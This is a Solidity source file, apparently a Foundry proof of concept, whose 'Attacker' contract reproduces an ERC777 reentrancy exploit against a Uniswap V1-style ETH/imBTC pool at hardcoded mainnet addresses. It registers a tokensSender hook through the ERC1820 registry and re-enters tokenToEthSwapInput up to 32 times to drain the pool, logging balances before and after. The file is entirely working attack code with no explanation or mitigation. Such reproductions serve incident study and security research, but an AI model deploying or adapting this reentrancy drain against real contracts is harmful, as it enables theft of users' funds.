// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

interface IERC1820Registry {
    function setInterfaceImplementer(address, bytes32, address) external;
}

interface IERC777 {
    // write
    function approve(address, uint256) external;
    // read
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface Factory {
    // write
    function ethToTokenSwapInput(uint256, uint256) external payable; 
    function tokenToEthSwapInput(uint256, uint256, uint256) external;
    // read
    function getEthToTokenInputPrice(uint256) external view returns (uint256);
}

contract Attacker {
    // ERC777TokensSender
    bytes32 constant private _TOKENS_SENDER_INTERFACE_HASH = 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    IERC777 imBTC = IERC777(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    Factory ETH_imBTC = Factory(0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187);

    uint8 entry;

    function run() public {
        imBTC.approve(address(ETH_imBTC), 2 ** 256 - 1);
        _erc1820.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));

        console.log("before attacker ETH:", address(this).balance);
        console.log("before attacker imBTC:", imBTC.balanceOf(address(this)));
        console.log("before pool ETH:", address(ETH_imBTC).balance);
        console.log("before pool imBTC:", imBTC.balanceOf(address(ETH_imBTC)));

        entry = 1;

        console.log("----attack----");

        ETH_imBTC.ethToTokenSwapInput{value: address(this).balance}(1, 1999999999999);
        ETH_imBTC.tokenToEthSwapInput(imBTC.balanceOf(address(this)) / 32, 1, 1999999999999);
        ETH_imBTC.ethToTokenSwapInput{value: address(ETH_imBTC).balance * 100}(1, 1999999999999);

        console.log("after attacker ETH:", address(this).balance);
        console.log("after attacker imBTC:", imBTC.balanceOf(address(this)));
        console.log("after pool ETH:", address(ETH_imBTC).balance);
        console.log("after pool imBTC:", imBTC.balanceOf(address(ETH_imBTC)));
    }

    function tokensToSend(
        address,
        address,
        address to,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        if (to == address(ETH_imBTC) && entry < 32) {
            entry++;
            ETH_imBTC.tokenToEthSwapInput(imBTC.balanceOf(address(this)) / 32, 1, 1999999999999);
        }
    }

    receive() external payable {}
}
